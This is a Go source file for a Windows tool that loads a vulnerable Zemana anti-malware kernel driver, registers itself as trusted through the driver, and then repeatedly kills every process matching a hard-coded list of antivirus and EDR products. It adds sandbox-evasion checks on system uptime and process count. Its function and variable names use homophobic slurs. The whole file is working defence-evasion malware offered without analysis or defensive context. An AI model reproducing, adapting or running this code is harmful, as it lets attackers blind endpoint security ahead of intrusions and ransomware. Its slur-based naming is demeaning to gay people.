package main

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"
    "time"
	"golang.org/x/sys/windows"
)

const (
	IOCTL_REGISTER_PROCESS  = 0x80002010
	IOCTL_TERMINATE_PROCESS = 0x80002048
)

var _ unsafe.Pointer

// Do the interface allocations only once for common
// Errno values.
const (
	errnoERROR_IO_PENDING = 997
)

var (
	errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
	errERROR_EINVAL     error = syscall.EINVAL
)

// errnoErr returns common boxed Errno values, to prevent
// allocations at runtime.
func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return errERROR_EINVAL
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}
	// TODO: add more here, after collecting data on the common
	// error values see on Windows. (perhaps when running
	// all.bat?)
	return e
}



var (
	gtc = syscall.NewLazyDLL("kernel32.dll").NewProc("GetTickCount")
	mk32          = windows.NewLazySystemDLL("Kernel32.dll")
	pep   = mk32.NewProc("K32EnumProcesses")
	devico  = mk32.NewProc("DeviceIoControl")
	drivnam = "Terminator"
	edrgaylist     = []string{
		"activeconsole", "anti malware", "anti-malware",
		"antimalware", "anti virus", "anti-virus",
		"antivirus", "appsense", "authtap",
		"avast", "avecto", "canary",
		"carbonblack", "carbon black", "cb.exe",
		"ciscoamp", "cisco amp", "countercept",
		"countertack", "cramtray", "crssvc",
		"crowdstrike", "csagent", "csfalcon",
		"csshell", "cybereason", "cyclorama",
		"cylance", "cyoptics", "cyupdate",
		"cyvera", "cyserver", "cytray",
		"darktrace", "defendpoint", "defender",
		"eectrl", "elastic", "endgame",
		"f-secure", "forcepoint", "fireeye",
		"groundling", "GRRservic", "inspector",
		"ivanti", "kaspersky", "lacuna",
		"logrhythm", "malware", "mandiant",
		"mcafee", "morphisec", "msascuil",
		"msmpeng", "nissrv", "omni",
		"omniagent", "osquery", "palo alto networks",
		"pgeposervice", "pgsystemtray", "privilegeguard",
		"procwall", "protectorservic", "qradar",
		"redcloak", "secureworks", "securityhealthservice",
		"semlaunchsv", "sentinel", "sepliveupdat",
		"sisidsservice", "sisipsservice", "sisipsutil",
		"smc.exe", "smcgui", "snac64",
		"sophos", "splunk", "srtsp",
		"servicehost.exe", "mcshield.exe",
		"mcupdatemgr.exe", "QcShm.exe", "ModuleCoreService.exe", "PEFService.exe", "McAWFwk.exe", "mfemms.exe", "mfevtps.exe", "McCSPServiceHost.exe", "Launch.exe", "delegate.exe", "McDiReg.exe", "McPvTray.exe", "McInstruTrack.exe", "McUICnt.exe", "ProtectedModuleHost.exe", "MMSSHOST.exe", "MfeAVSvc.exe",
		"symantec", "symcorpu", "symefasi",
		"sysinternal", "sysmon", "tanium",
		"tda.exe", "tdawork", "tpython",
		"mcapexe.exe",
		"vectra", "wincollect", "windowssensor",
		"wireshark", "threat", "xagt.exe",
		"xagtnotif.exe", "mssense", "efwd.exe", "ekrn.exe",
	}
)

func loaddriv(driverPath string) bool {
	manghand, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_ALL_ACCESS)
	if err != nil {
		fmt.Println("erm... Failed to open service control manager:", err)
		return true
	}
	defer windows.CloseServiceHandle(manghand)

	serviceHandle, err := windows.OpenService(manghand, windows.StringToUTF16Ptr(drivnam), windows.SERVICE_ALL_ACCESS)
	if err == nil {
		fmt.Println("erm... Service already exists.")
		var serviceStatus windows.SERVICE_STATUS
		err := windows.QueryServiceStatus(serviceHandle, &serviceStatus)
		if err != nil {
			fmt.Println("erm... Failed to query service status:", err)
			return true
		}
		if serviceStatus.CurrentState == windows.SERVICE_STOPPED {
			err = windows.StartService(serviceHandle, 0, nil)
			if err != nil {
				fmt.Println("erm... Failed to start service:", err)
				return true
			}
			fmt.Println("erm... Starting service...")
		}
		windows.CloseServiceHandle(serviceHandle)
		return false
	}

	driverPathPtr, err := syscall.UTF16PtrFromString(driverPath)
	if err != nil {
		fmt.Println("erm... Failed to convert driver path:", err)
		return true
	}

	serviceHandle, err = windows.CreateService(manghand, windows.StringToUTF16Ptr(drivnam),
		windows.StringToUTF16Ptr(drivnam), windows.SERVICE_ALL_ACCESS, windows.SERVICE_KERNEL_DRIVER,
		windows.SERVICE_DEMAND_START, windows.SERVICE_ERROR_IGNORE, driverPathPtr, nil, nil, nil, nil, nil)
	if err != nil {
		fmt.Println("erm... Failed to create service:", err)
		return true
	}
	fmt.Println("erm... Service created successfully.")

	err = windows.StartService(serviceHandle, 0, nil)
	if err != nil {
		fmt.Println("erm... Failed to start service:", err)
		windows.CloseServiceHandle(serviceHandle)
		return true
	}
	fmt.Println("erm... started service...")
	windows.CloseServiceHandle(serviceHandle)

	return false
}

func gay(str string) string {
	return strings.ToLower(str)
}

func edrlistcheck(pn string) bool {
	tempv := gay(pn)
	for _, edr := range edrgaylist {
		if strings.Contains(tempv, edr) {
			return true
		}
	}
	return false
}

func DeviceIoControl(p1 windows.Handle, p2 uint32, p3 uintptr, p4 uint32, p5 uintptr, p6 uint32, p7 *uint32, p8 uintptr) (err error) {
	r1, _, e1 := syscall.Syscall9(devico.Addr(), 8, uintptr(p1), uintptr(p2), p3, uintptr(p4), p5, uintptr(p6), uintptr(unsafe.Pointer(p7)), p8, 0)
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}


func edrcheck(hDevice windows.Handle) int {
	var procId, pOutbuff uint32
	var bytesRet uint32
	var ecount int
	var hSnap windows.Handle

	hSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		fmt.Println("ermm.... failed to create process snapshot:", err)
		return ecount
	}
	defer windows.CloseHandle(hSnap)

	var pE windows.ProcessEntry32
	pE.Size = uint32(unsafe.Sizeof(pE))

	err = windows.Process32First(hSnap, &pE)

	for {
		if err != nil {
			break
		}
		exeName := windows.UTF16ToString(pE.ExeFile[:])
		if edrlistcheck(exeName) {
			procId = pE.ProcessID
			err := DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS,
				uintptr(unsafe.Pointer(&procId)), uint32(unsafe.Sizeof(procId)),
				uintptr(unsafe.Pointer(&pOutbuff)), uint32(unsafe.Sizeof(pOutbuff)),
				&bytesRet, 0)
			if err != nil {
				fmt.Printf("erm... failed to terminate %s !!\n", exeName)
			} else {
				fmt.Printf("erm... terminated %s\n", exeName)
				ecount++
			}
		}
		err = windows.Process32Next(hSnap, &pE)
	}
	return ecount

}

func rpc() int {
	// current running proceesses
	var ids [1024]uint32
	var needed uint32
	pep.Call(uintptr(unsafe.Pointer(&ids)), uintptr(len(ids)), uintptr(unsafe.Pointer(&needed)))
	return int(needed / 4)
}

func main() {

	heh, _, _ := gtc.Call()
	if heh/1000 < 1200 {
		os.Exit(-1)
	}
	// Check Processes (Workstations have most of the time less than 50)
	count := rpc()
	if count < 50 {
		return
	}
	
	var FullDriverPath string

	hFind, _ := syscall.FindFirstFile(syscall.StringToUTF16Ptr("Terminator.sys"), &syscall.Win32finddata{})

	if hFind != syscall.InvalidHandle { // file is not found
		var err error
		FullDriverPath, err = syscall.FullPath("Terminator.sys")
		if err != nil { // full path is not found
			fmt.Println("Path not found !!")
			os.Exit(-1)
		}
	} else {
		fmt.Println("Driver not found !!")
		os.Exit(-1)
	}
	fmt.Printf("Driver path: %s\n", FullDriverPath)

	if loaddriv(FullDriverPath) {
		fmt.Println("Failed to load driver, try to run the program as administrator!!")
		os.Exit(-1)
	}
	fmt.Println("Driver loaded successfully !!")

	hDevice, err := syscall.CreateFile(syscall.StringToUTF16Ptr(`\\.\ZemanaAntiMalware`), syscall.GENERIC_WRITE|syscall.GENERIC_READ, 0,
		nil, syscall.OPEN_EXISTING, syscall.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		fmt.Println("Failed to open handle to driver !!")
		os.Exit(-1)
	}

	var input uint32 = uint32(windows.GetCurrentProcessId())
	var dummy uint32
	if err := DeviceIoControl(windows.Handle(hDevice), IOCTL_REGISTER_PROCESS, uintptr(unsafe.Pointer(&input)), uint32(unsafe.Sizeof(input)),
		0, 0, &dummy, 0); err != nil {
	
		fmt.Printf("Failed to register the process in the trusted list %X !!\n", IOCTL_REGISTER_PROCESS)
		syscall.CloseHandle(hDevice)
		os.Exit(-1)
	}
	fmt.Printf("Process registered in the trusted list %X !!\n", IOCTL_REGISTER_PROCESS)

	fmt.Println("Terminating ALL EDR/XDR/AVs...")
	for {
		if count := edrcheck(windows.Handle(hDevice)); count == 0 {
			time.Sleep(1 * time.Second)
		} else {
			time.Sleep(1 * time.Second)
		}
	}
}